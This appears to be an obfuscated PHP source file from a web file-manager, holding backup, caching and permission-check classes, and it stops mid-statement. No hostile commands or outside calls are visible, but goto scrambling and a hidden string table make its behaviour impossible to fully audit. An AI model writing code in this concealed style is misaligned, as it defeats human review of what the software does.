<?php
 goto DªÕ‡¢ÓÒí; c—Áí»—¡: class BackupFile { public function __construct() { } public function index() { goto b›ø†ššÓÙ; fá’¾ÎÄ·ğ: $E…ë™ó«æé = (int) Model($_SERVER[¹Ò‹Ò¹][733])->where($A£Œ´—Â½…)->count($_SERVER[¹Ò‹Ò¹][441]); $e—­‘÷âŒÌ = (int) Model($_SERVER[¹Ò‹Ò¹][733])->where($A£Œ´—Â½…)->sum($_SERVER[¹Ò‹Ò¹][77]); $Bæ“†Ÿ¢‡ = new TaskFileTransfer($_SERVER[¹Ò‹Ò¹][755], $_SERVER[¹Ò‹Ò¹][728], $E…ë™ó«æé, LNG($_SERVER[¹Ò‹Ò¹][729]) . $_SERVER[¹Ò‹Ò¹][730] . LNG($_SERVER[¹Ò‹Ò¹][756])); goto c§ÃÒĞ›¤; BèÒ…åÀ³»: $A¾›†ÇÑ„ = !0; $dâ•‚ìÏ•‰ = $this->storeIds(); $b˜”òåéÉÊ = 1; goto d×ãËÃ‘Ùä; bÅ‡á®â—¢: $this->_fileFilter($c¨³À±“Ø); return !0; goto CÄ¶‚ò¨Îª; b›ø†ššÓÙ: $D÷Ï§Ëø‡ = Backup::get(); $cÕ•½š²¿İ = $D÷Ï§Ëø‡[$_SERVER[¹Ò‹Ò¹][289]][$_SERVER[¹Ò‹Ò¹][191]][$_SERVER[¹Ò‹Ò¹][441]]; $A£Œ´—Â½… = array($_SERVER[¹Ò‹Ò¹][442] => array($_SERVER[¹Ò‹Ò¹][753], $cÕ•½š²¿İ), $_SERVER[¹Ò‹Ò¹][754] => array($_SERVER[¹Ò‹Ò¹][327], $D÷Ï§Ëø‡[$_SERVER[¹Ò‹Ò¹][706]])); goto fá’¾ÎÄ·ğ; fÎ¶Äë¿¢ë: $f¡àˆ”ší° = $f•³ã¯º£‘ = 0; do { $C£ô³çÍæ… = $_SERVER[¹Ò‹Ò¹][759]; $EÌ¨ğß™•Û = Model($_SERVER[¹Ò‹Ò¹][733])->where($A£Œ´—Â½…)->field($C£ô³çÍæ…)->order($_SERVER[¹Ò‹Ò¹][760])->selectPage($dÉö†¡…, $b˜”òåéÉÊ); $D©ººÃóÅ = !empty($EÌ¨ğß™•Û[$_SERVER[¹Ò‹Ò¹][365]]) ? $EÌ¨ğß™•Û[$_SERVER[¹Ò‹Ò¹][365]] : array(); foreach ($D©ººÃóÅ as $DÆ½ÄéŠÓ¯) { goto Cé„“êÔÖĞ; E’­ÁßÄßË: if ($E³Éñ¹ªó >= 1024 * 1024 * 100) { $açåÁåÃ£ = array($_SERVER[¹Ò‹Ò¹][765] => $cÕ•½š²¿İ, $_SERVER[¹Ò‹Ò¹][766] => $f•³ã¯º£‘, $_SERVER[¹Ò‹Ò¹][767] => $f¡àˆ”ší°); Backup::set($açåÁåÃ£); $E³Éñ¹ªó = $e™ŠòÀÉ¿Ú = 0; } goto Fò ÑØ‰Ú…; Cé„“êÔÖĞ: if (!$this->_fileExist($DÆ½ÄéŠÓ¯, $c¨³À±“Ø, $dâ•‚ìÏ•‰)) { $E…ë™ó«æé -= 1; $e—­‘÷âŒÌ -= (int) $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][77]]; write_log("\146\151\x6c\x65\40\x6e\x6f\164\x20\x65\x78\x69\x73\x74\x2e\146\151\154\145\x49\104\72{$DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][441]]}\54\40\x70\x61\164\150\72{$DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][75]]}", $_SERVER[¹Ò‹Ò¹][761]); continue; } $cö¥Ë„‡î = $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][75]]; $D•à«Œ‹£ = "\x7b\151\x6f\x3a{$D÷Ï§Ëø‡[$_SERVER[¹Ò‹Ò¹][706]]}\175" . substr($cö¥Ë„‡î, strlen("\x7b\151\x6f\72{$DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][762]]}\x7d")); goto a·ËÂÓÜµ£; a·ËÂÓÜµ£: if (IO::exist($D•à«Œ‹£)) { $Bæ“†Ÿ¢‡->updateFileEnd($DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][28]], $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][77]]); } else { $D•à«Œ‹£ = get_path_father($D•à«Œ‹£); IO::mkdir($D•à«Œ‹£); if (!IO::copy($cö¥Ë„‡î, $D•à«Œ‹£, $_SERVER[¹Ò‹Ò¹][763])) { write_log($_SERVER[¹Ò‹Ò¹][764] . $cö¥Ë„‡î . $_SERVER[¹Ò‹Ò¹][749] . $D•à«Œ‹£ . $_SERVER[¹Ò‹Ò¹][499], $_SERVER[¹Ò‹Ò¹][728]); $A¾›†ÇÑ„ = !1; break; } } $cÕ•½š²¿İ = $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][441]]; $e™ŠòÀÉ¿Ú += 1; goto eëŠˆ¥ØğË; eëŠˆ¥ØğË: $E³Éñ¹ªó += $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][77]]; $f•³ã¯º£‘ += 1; $f¡àˆ”ší° += $DÆ½ÄéŠÓ¯[$_SERVER[¹Ò‹Ò¹][77]]; goto E’­ÁßÄßË; Fò ÑØ‰Ú…: } $bÑª„–ÌÅ¦ = count($D©ººÃóÅ); $b˜”òåéÉÊ++; } while ($bÑª„–ÌÅ¦ == $dÉö†¡…); $Bæ“†Ÿ¢‡->end(); goto f‘ƒÏçÏ‹ª; f‘ƒÏçÏ‹ª: $açåÁåÃ£ = array($_SERVER[¹Ò‹Ò¹][768] => 1, $_SERVER[¹Ò‹Ò¹][470] => time(), $_SERVER[¹Ò‹Ò¹][723] => 1, $_SERVER[¹Ò‹Ò¹][765] => $cÕ•½š²¿İ, $_SERVER[¹Ò‹Ò¹][758] => $e—­‘÷âŒÌ, $_SERVER[¹Ò‹Ò¹][757] => $E…ë™ó«æé); if ($e™ŠòÀÉ¿Ú) { $açåÁåÃ£[$_SERVER[¹Ò‹Ò¹][766]] = $f•³ã¯º£‘; $açåÁåÃ£[$_SERVER[¹Ò‹Ò¹][767]] = $f¡àˆ”ší°; } Backup::set($açåÁåÃ£); goto bÅ‡á®â—¢; d×ãËÃ‘Ùä: $dÉö†¡… = 1000; $E³Éñ¹ªó = $e™ŠòÀÉ¿Ú = 0; $c¨³À±“Ø = array(); goto fÎ¶Äë¿¢ë; c§ÃÒĞ›¤: $Bæ“†Ÿ¢‡->task[$_SERVER[¹Ò‹Ò¹][713]] = $e—­‘÷âŒÌ; $açåÁåÃ£ = array($_SERVER[¹Ò‹Ò¹][757] => $E…ë™ó«æé, $_SERVER[¹Ò‹Ò¹][758] => $e—­‘÷âŒÌ); Backup::set($açåÁåÃ£); goto BèÒ…åÀ³»; CÄ¶‚ò¨Îª: } private function _fileExist($Bï¯ÔÂœ, &$Eìî•¤š‚Ë, $eğƒ¼„ŠëÑ) { goto a˜–­ƒ³ö; a˜–­ƒ³ö: $e¸ªÍ¸´¤ =& $_SERVER[¹Ò‹Ò¹]; $aÉî®õº± = $Bï¯ÔÂœ[$e¸ªÍ¸´¤[75]]; if (in_array($Bï¯ÔÂœ[$e¸ªÍ¸´¤[441]], $Eìî•¤š‚Ë)) { return !1; } goto F†ª–ª£È; EŒ¹ìÖ£Ç: if (IO::exist($aËà„¶¬)) { $Eìî•¤š‚Ë[] = $Bï¯ÔÂœ[$e¸ªÍ¸´¤[441]]; return !1; } $e ±‘ó­µÓ = array($e¸ªÍ¸´¤[762] => $Bï¯ÔÂœ[$e¸ªÍ¸´¤[762]], $e¸ªÍ¸´¤[75] => array($e¸ªÍ¸´¤[378], "{$aËà„¶¬}\45")); $fğ³ª­ğë = Model($e¸ªÍ¸´¤[733])->where($e ±‘ó­µÓ)->field($e¸ªÍ¸´¤[442])->select(); goto A¹‡³ÚÈ›‹; A¹‡³ÚÈ›‹: $Eìî•¤š‚Ë = array_merge($Eìî•¤š‚Ë, array_to_keyvalue($fğ³ª­ğë, $e¸ªÍ¸´¤[33], $e¸ªÍ¸´¤[441])); return !1; goto fååÁÆîÎ; F†ª–ª£È: if (!in_array($Bï¯ÔÂœ[$e¸ªÍ¸´¤[762]], $eğƒ¼„ŠëÑ)) { return !1; } if (IO::exist($aÉî®õº±)) { return !0; } $aËà„¶¬ = get_path_father($aÉî®õº±); goto EŒ¹ìÖ£Ç; fååÁÆîÎ: } private function _fileFilter($AŒêŞßß¢) { $D‡è­®‹à =& $_SERVER[¹Ò‹Ò¹]; if (empty($AŒêŞßß¢)) { return; } $aªâæ¸‚†Ğ = array($D‡è­®‹à[441] => array($D‡è­®‹à[7], array_unique($AŒêŞßß¢))); $D‰î¼Ú„Œï = Model($D‡è­®‹à[769])->where($aªâæ¸‚†Ğ)->field($D‡è­®‹à[390])->select(); foreach ($D‰î¼Ú„Œï as $E¼Áí¡©É‡) { Model($D‡è­®‹à[769])->remove($E¼Áí¡©É‡[$D‡è­®‹à[390]], !1); } } private function storeIds() { $BˆËĞøêğ =& $_SERVER[¹Ò‹Ò¹]; $Eù‚»¿ˆ× = Model($BˆËĞøêğ[718])->listData(); $f ±Î‹ÊÆ = array(); $C¢…Èå‘Á¿ = $GLOBALS[$BˆËĞøêğ[6]][$BˆËĞøêğ[87]][$BˆËĞøêğ[770]]; foreach ($Eù‚»¿ˆ× as $Bˆ†õãÁ˜Ø) { $e òçÃ‹â× = strtolower($Bˆ†õãÁ˜Ø[$BˆËĞøêğ[93]]); if (!isset($C¢…Èå‘Á¿[$e òçÃ‹â×])) { continue; } $Dš¦Š”É•§ = $BˆËĞøêğ[71] . (isset($C¢…Èå‘Á¿[$e òçÃ‹â×]) ? $C¢…Èå‘Á¿[$e òçÃ‹â×] : ucfirst($e òçÃ‹â×)); if (!class_exists($Dš¦Š”É•§)) { continue; } $f ±Î‹ÊÆ[] = $Bˆ†õãÁ˜Ø[$BˆËĞøêğ[388]]; } return $f ±Î‹ÊÆ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto B‹Öä»Â­¼; F‰³ğ³Ç…: switch ($Aø¥ÖŸ½å[$f„¤…´„Ø[771]]) { case $f„¤…´„Ø[17]: self::$handle = Model($f„¤…´„Ø[773]); break; case $f„¤…´„Ø[774]: self::$handle = new CacheRedis($d½Æ®òã’, $aœ¬íàõ„); break; case $f„¤…´„Ø[775]: self::$handle = new CacheMemcached($d½Æ®òã’, $aœ¬íàõ„); break; case $f„¤…´„Ø[191]: self::$handle = new CacheFile($d½Æ®òã’, $aœ¬íàõ„); break; default: break; } return self::$handle; goto CŒ¥ÊÉ”µ“; B‹Öä»Â­¼: $f„¤…´„Ø =& $_SERVER[¹Ò‹Ò¹]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto B¸ÆÏõì‰; B¸ÆÏõì‰: $Aø¥ÖŸ½å = $GLOBALS[$f„¤…´„Ø[6]][$f„¤…´„Ø[345]]; $d½Æ®òã’ = $Aø¥ÖŸ½å[$Aø¥ÖŸ½å[$f„¤…´„Ø[771]]]; $aœ¬íàõ„ = $Aø¥ÖŸ½å[$f„¤…´„Ø[772]]; goto F‰³ğ³Ç…; CŒ¥ÊÉ”µ“: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eë”•Ù ) { if (is_array($eë”•Ù ) || is_object($eë”•Ù )) { $eë”•Ù  = json_encode($eë”•Ù ); } $eë”•Ù  = rawurlencode($eë”•Ù ); return md5(KOD_SITE_ID . $_SERVER[¹Ò‹Ò¹][70] . $eë”•Ù ); } public static function get($a¼‹áÌ°¸ó, $b–›˜Šà¹ß = false) { $a¿ëÊê˜¡Ê = self::key($a¼‹áÌ°¸ó); if ($b–›˜Šà¹ß) { return unserialize(self::init()->get($a¿ëÊê˜¡Ê)); } if (!isset(self::$memoryCache[$a¿ëÊê˜¡Ê])) { $c¨Ãõ‘é–Í = self::init()->get($a¿ëÊê˜¡Ê); self::$memoryCache[$a¿ëÊê˜¡Ê] = unserialize($c¨Ãõ‘é–Í); } return self::$memoryCache[$a¿ëÊê˜¡Ê]; } public static function set($fŸ˜Áˆ®ä†, $d·­¢±ŸØ, $eì–³ÅÜÉĞ = false) { goto d©´à”’ºì; d©´à”’ºì: $bå–ßêÓ…Ì = self::key($fŸ˜Áˆ®ä†); if (isset(self::$memoryCache[$bå–ßêÓ…Ì]) && self::$memoryCache[$bå–ßêÓ…Ì] === $d·­¢±ŸØ) { return !0; } if ($eì–³ÅÜÉĞ === 0) { self::$memoryCache[$bå–ßêÓ…Ì] = $d·­¢±ŸØ; return !0; } goto a†ƒ•å°Èé; DÎ²²ÏÄ•å: CacheLock::unlock($fŸ˜Áˆ®ä†); return $dëë‰ááã; goto fÉ‚Î…»µŒ; a†ƒ•å°Èé: CacheLock::lock($fŸ˜Áˆ®ä†); $dëë‰ááã = self::init()->set($bå–ßêÓ…Ì, serialize($d·­¢±ŸØ), $eì–³ÅÜÉĞ); self::$memoryCache[$bå–ßêÓ…Ì] = $d·­¢±ŸØ; goto DÎ²²ÏÄ•å; fÉ‚Î…»µŒ: } public static function getCall($F‰ÌÃŠæØµ, $E¨Õã¤¢ßñ, $A±‚ãáòÚ¹, $CµÜ­®Ô = array()) { $aâ³Û—ÀòĞ = self::get($F‰ÌÃŠæØµ); if ($aâ³Û—ÀòĞ) { return $aâ³Û—ÀòĞ; } $aâ³Û—ÀòĞ = call_user_func_array($A±‚ãáòÚ¹, $CµÜ­®Ô); self::set($F‰ÌÃŠæØµ, $aâ³Û—ÀòĞ, $E¨Õã¤¢ßñ); return $aâ³Û—ÀòĞ; } public static function remove($F¯ÔÄßùˆ…) { goto e‰Ñ´µÎâ; B§ÑéÉàğ“: return $e˜ë˜¦¸®; goto e‘›Œ ›Ì§; c¬’§ÊÄ²¶: CacheLock::lock($F¯ÔÄßùˆ…); $e˜ë˜¦¸® = self::init()->remove($Eµµ¡¢ƒ²); CacheLock::unlock($F¯ÔÄßùˆ…); goto B§ÑéÉàğ“; e‰Ñ´µÎâ: $Eµµ¡¢ƒ² = self::key($F¯ÔÄßùˆ…); unset(self::$memoryCache[$Eµµ¡¢ƒ²]); self::clearTimeout(); goto c¬’§ÊÄ²¶; e‘›Œ ›Ì§: } public static function removeMemory($dƒôºÍ) { $a¯Ôß¬—èË = self::key($dƒôºÍ); unset(self::$memoryCache[$a¯Ôß¬—èË]); } public static function clearMemory($e„¦„œáİŞ = false) { if ($e„¦„œáİŞ) { $e„¦„œáİŞ = self::key($e„¦„œáİŞ); unset(self::$memoryCache[$e„¦„œáİŞ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹Ò‹Ò¹][776])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹Ò‹Ò¹][777])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($dù‹Ù„ºù“, $D¤©šî®ß¦) { $A›æ»ÓªÜ =& $_SERVER[¹Ò‹Ò¹]; $this->cachePath = $dù‹Ù„ºù“[$A›æ»ÓªÜ[75]]; $this->prefix = $A›æ»ÓªÜ[778]; $this->cacheTime = $D¤©šî®ß¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($DÂ©Ò›Ëá) { $FÂäãñÆİ¹ =& $_SERVER[¹Ò‹Ò¹]; $DÂ©Ò›Ëá = str_replace(array($FÂäãñÆİ¹[779], $FÂäãñÆİ¹[96], $FÂäãñÆİ¹[69]), $FÂäãñÆİ¹[780], $DÂ©Ò›Ëá); return $this->cachePath . $FÂäãñÆİ¹[781] . $DÂ©Ò›Ëá . $FÂäãñÆİ¹[782]; } public function set($b¤§™‰åØë, $a÷‡ù¼Ø‹‰, $E¬Şá§ìÙÙ = false) { $a ¿¢ÇŒ§• = $this->getFile($b¤§™‰åØë); if (file_put_contents($a ¿¢ÇŒ§•, $this->prefix . $a÷‡ù¼Ø‹‰, LOCK_EX)) { return !0; } @unlink($a ¿¢ÇŒ§•); return !1; } public function get($C¼¤İì¹×‚) { $aÓœ°ã»Ş = $this->getFile($C¼¤İì¹×‚); if (file_exists($aÓœ°ã»Ş) && filemtime($aÓœ°ã»Ş) < time() - $this->cacheTime) { @unlink($aÓœ°ã»Ş); return !1; } $a¬åš¡ø© = @file_get_contents($aÓœ°ã»Ş); return substr($a¬åš¡ø©, strlen($this->prefix)); } public function remove($bßİíòïÔŠ) { $Eâ¶´‡¢‚« = $this->getFile($bßİíòïÔŠ); return @unlink($Eâ¶´‡¢‚«); } public function deleteAll() { $DÛÈ’Û½ç =& $_SERVER[¹Ò‹Ò¹]; $BÆêÜƒì¤¨ = scandir($this->cachePath); foreach ($BÆêÜƒì¤¨ as $F‡–±†¿Êƒ) { $B­¥¨Œ³÷Ì = $this->cachePath . $F‡–±†¿Êƒ; if (strpos($B­¥¨Œ³÷Ì, $DÛÈ’Û½ç[782]) && strpos($B­¥¨Œ³÷Ì, $DÛÈ’Û½ç[783])) { @unlink($B­¥¨Œ³÷Ì); } } } public function clearTimeout() { $BÛŞ”Ê…‹¡ =& $_SERVER[¹Ò‹Ò¹]; $B©š¢¿…ˆ = scandir($this->cachePath); foreach ($B©š¢¿…ˆ as $F…ßÎ—¦‡ë) { $aÕìÁ°¹Ú = $this->cachePath . $F…ßÎ—¦‡ë; if (strpos($aÕìÁ°¹Ú, $BÛŞ”Ê…‹¡[782]) && strpos($aÕìÁ°¹Ú, $BÛŞ”Ê…‹¡[783]) && filemtime($aÕìÁ°¹Ú) < time() - $this->cacheTime) { @unlink($aÕìÁ°¹Ú); } } } } goto a­øøãëéº; a©ÔÚÏª„ô: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Fš¦°ôÄœá =& $_SERVER[¹Ò‹Ò¹]; $cª¨¬ÔÏ‰ = array(array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1668]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1670], $Fš¦°ôÄœá[1671] => 1, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1674]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1675], $Fš¦°ôÄœá[1671] => 2, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1676]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1677], $Fš¦°ôÄœá[1671] => 3, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1678]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1679], $Fš¦°ôÄœá[1671] => 4, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_VIEW), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1680]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1681], $Fš¦°ôÄœá[1671] => 5, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1682]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1683], $Fš¦°ôÄœá[1671] => 6, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Fš¦°ôÄœá[407] => LNG($Fš¦°ôÄœá[1684]), $Fš¦°ôÄœá[1669] => $Fš¦°ôÄœá[1685], $Fš¦°ôÄœá[1671] => 7, $Fš¦°ôÄœá[1672] => 1, $Fš¦°ôÄœá[1673] => 0)); return $cª¨¬ÔÏ‰; } public static function authCheck($e‡‘·ñ„åÈ, $Cƒ¢Å¶ç¡ ) { $e‡‘·ñ„åÈ = intval($e‡‘·ñ„åÈ); if ($GLOBALS[$_SERVER[¹Ò‹Ò¹][479]]) { return !0; } if ($e‡‘·ñ„åÈ <= 0) { return !1; } if (($e‡‘·ñ„åÈ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($e‡‘·ñ„åÈ & $Cƒ¢Å¶ç¡ ); } public static function authCheckShow($CÛ„¤×æèÆ) { return self::authCheck($CÛ„¤×æèÆ, self::AUTH_SHOW); } public static function authCheckView($aœ×ºÀÑ„²) { return self::authCheck($aœ×ºÀÑ„², self::AUTH_VIEW); } public static function authCheckDownload($F¯êôÎ‚Œ) { return self::authCheck($F¯êôÎ‚Œ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($B«£±¯ùÕ) { return self::authCheck($B«£±¯ùÕ, self::AUTH_UPLOAD); } public static function authCheckEdit($Cˆ„ääñ»Í) { return self::authCheck($Cˆ„ääñ»Í, self::AUTH_EDIT); } public static function authCheckRemove($A´Ÿ¥É®¢Ë) { return self::authCheck($A´Ÿ¥É®¢Ë, self::AUTH_REMOVE); } public static function authCheckShare($EÔ•Ê·¬«) { return self::authCheck($EÔ•Ê·¬«, self::AUTH_SHARE); } public static function authCheckComment($d¢Óº‘Œù) { return self::authCheck($d¢Óº‘Œù, self::AUTH_COMMENT); } public static function authCheckEvent($DŒ¸ŠÆùö) { return self::authCheck($DŒ¸ŠÆùö, self::AUTH_EVENT); } public static function authCheckRoot($F¹¹Õï±çÎ) { return self::authCheck($F¹¹Õï±çÎ, self::AUTH_ROOT); } public static function authCheckAction($dªŠˆŞ¨§ó, $Aò‹‹ÚÃ¨ó) { goto e‚ÉÕ¹—§ç; e‚ÉÕ¹—§ç: $dÀÆÓµÚÏĞ =& $_SERVER[¹Ò‹Ò¹]; $C¢Ò½ÉùÜ‰ = array($dÀÆÓµÚÏĞ[1686] => self::AUTH_VIEW, $dÀÆÓµÚÏĞ[1069] => self::AUTH_DOWNLOAD, $dÀÆÓµÚÏĞ[106] => self::AUTH_UPLOAD, $dÀÆÓµÚÏĞ[1634] => self::AUTH_EDIT, $dÀÆÓµÚÏĞ[1633] => self::AUTH_REMOVE, $dÀÆÓµÚÏĞ[1644] => self::AUTH_SHARE, $dÀÆÓµÚÏĞ[350] => self::AUTH_COMMENT, $dÀÆÓµÚÏĞ[1493] => self::AUTH_EVENT, $dÀÆÓµÚÏĞ[1687] => self::AUTH_ROOT); if (!isset($C¢Ò½ÉùÜ‰[$Aò‹‹ÚÃ¨ó])) { return; } goto d³ö¨«Ê˜Ë; d³ö¨«Ê˜Ë: $e±ñ«ô¹âŞ = $C¢Ò½ÉùÜ‰[$Aò‹‹ÚÃ¨ó]; $dªŠˆŞ¨§ó = intval($dªŠˆŞ¨§ó); if ($dªŠˆŞ¨§ó <= 0) { return !1; } goto BĞÈšÈ±; BĞÈšÈ±: if (($dªŠˆŞ¨§ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dªŠˆŞ¨§ó & $e±ñ«ô¹âŞ); goto D­Æ»äÅ–; D­Æ»äÅ–: } public static function authDisable($cÏ’‡ƒï, $D ò‘ÈØæî) { if (intval($cÏ’‡ƒï) <= 0) { return 0; } return intval($cÏ’‡ƒï) & ~$D ò‘ÈØæî; } public $optionType = "\x53\171\163\x74\145\155\56\x73\x6f\165\x72\x63\x65\x41\165\164\150\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\x74\150", "\x6c\x61\142\145\154", "\144\151\x73\160\154\141\x79", "\163\x79\x73\164\x65\155", "\163\x6f\162\164"); public function initData() { $C¿”©Æ›ê¨ = $this->authDefault(); foreach ($C¿”©Æ›ê¨ as $b½ÊŠßŒÛŸ) { $this->add($b½ÊŠßŒÛŸ); } } public function listData($b•½î¿„Ö = false, $a¿ÔÌ…ºªí = "\x73\x6f\162\164", $Eç…™ç¶·Á = false) { return parent::listData($b•½î¿„Ö, $a¿ÔÌ…ºªí, $Eç…™ç¶·Á); } public function update($BØî‡Ÿˆ†, $Dô½¾«‹–½) { $CŸ‘—½§… =& $_SERVER[¹Ò‹Ò¹]; $aØÌ¥¨÷Õ = parent::listData($BØî‡Ÿˆ†); $C¢¯Ş¢«ƒ = $this->findByName($Dô½¾«‹–½[$CŸ‘—½§…[28]]); if (!$aØÌ¥¨÷Õ || $C¢¯Ş¢«ƒ && $C¢¯Ş¢«ƒ[$CŸ‘—½§…[388]] != $aØÌ¥¨÷Õ[$CŸ‘—½§…[388]]) { return !1; } $this->filterAuth($Dô½¾«‹–½[$CŸ‘—½§…[400]]); return parent::update($BØî‡Ÿˆ†, $Dô½¾«‹–½); } public function remove($FÓñ…µºÌÒ) { $d’Á¿É© = parent::listData($FÓñ…µºÌÒ); if (!$d’Á¿É© || $d’Á¿É©[$_SERVER[¹Ò‹Ò¹][1144]]) { return !1; } return parent::remove($FÓñ…µºÌÒ); } public function add($d‚ãƒ½²…ñ = array()) { goto Câé®í—æ; Câé®í—æ: $b”Ş ¡†¡Š =& $_SERVER[¹Ò‹Ò¹]; if ($this->findByName($d‚ãƒ½²…ñ[$b”Ş ¡†¡Š[28]])) { return !1; } $bä‹ŠÔÙ¡ù = array($b”Ş ¡†¡Š[28] => $b”Ş ¡†¡Š[33], $b”Ş ¡†¡Š[400] => 1, $b”Ş ¡†¡Š[1688] => $b”Ş ¡†¡Š[1677], $b”Ş ¡†¡Š[1689] => 1, $b”Ş ¡†¡Š[1144] => 0, $b”Ş ¡†¡Š[1690] => 0); goto aÄÎÙ•ß²; F½ÎÍÌ…ª: return parent::insert($d‚ãƒ½²…ñ); goto d¬Ë…• •“; aÄÎÙ•ß²: $d‚ãƒ½²…ñ = array_merge($bä‹ŠÔÙ¡ù, $d‚ãƒ½²…ñ); $d‚ãƒ½²…ñ[$b”Ş ¡†¡Š[1690]] = $this->getSort(); $this->filterAuth($d‚ãƒ½²…ñ[$b”Ş ¡†¡Š[400]]); goto F½ÎÍÌ…ª; d¬Ë…• •“: } private function getSort() { $EÅ×…İŞ‹æ =& $_SERVER[¹Ò‹Ò¹]; $fà¥Ê ¦¥ˆ = parent::listData(); $B¬‡ŠÚ» = array_to_keyvalue($fà¥Ê ¦¥ˆ, $EÅ×…İŞ‹æ[33], $EÅ×…İŞ‹æ[1690]); return empty($B¬‡ŠÚ») ? 0 : max($B¬‡ŠÚ») + 1; } private function filterAuth(&$c­ô±ŒŠ˜¤) { goto fâÅÅÌŞŒ²; cù¿Şé†èŒ: foreach ($fÎ–‘ÓÄ‚ö as $fÆÄó±µ) { if (isset($c·…Ï•‰¡Œ[$fÆÄó±µ])) { $fÎ–‘ÓÄ‚ö = array_merge($fÎ–‘ÓÄ‚ö, $c·…Ï•‰¡Œ[$fÆÄó±µ]); } } $fÎ–‘ÓÄ‚ö[] = self::AUTH_SHOW; $c­ô±ŒŠ˜¤ = array_sum(array_unique($fÎ–‘ÓÄ‚ö)); goto CîÈÔ²¸; b¼æÎ±®È‰: foreach ($dŒïÇ”ƒó as $fÆÄó±µ) { if ($c­ô±ŒŠ˜¤ & $fÆÄó±µ) { $fÎ–‘ÓÄ‚ö[] = $fÆÄó±µ; } } if (in_array(self::AUTH_ROOT, $fÎ–‘ÓÄ‚ö)) { $c­ô±ŒŠ˜¤ = array_sum($dŒïÇ”ƒó); return; } $c·…Ï•‰¡Œ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto cù¿Şé†èŒ; fâÅÅÌŞŒ²: if (!$c­ô±ŒŠ˜¤) { return; } $dŒïÇ”ƒó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $fÎ–‘ÓÄ‚ö = array(); goto b¼æÎ±®È‰; CîÈÔ²¸: } public function sort($bŒ¦ƒˆ–ÅÊ, $Aå®êÊ§°) { return parent::update($bŒ¦ƒˆ–ÅÊ, 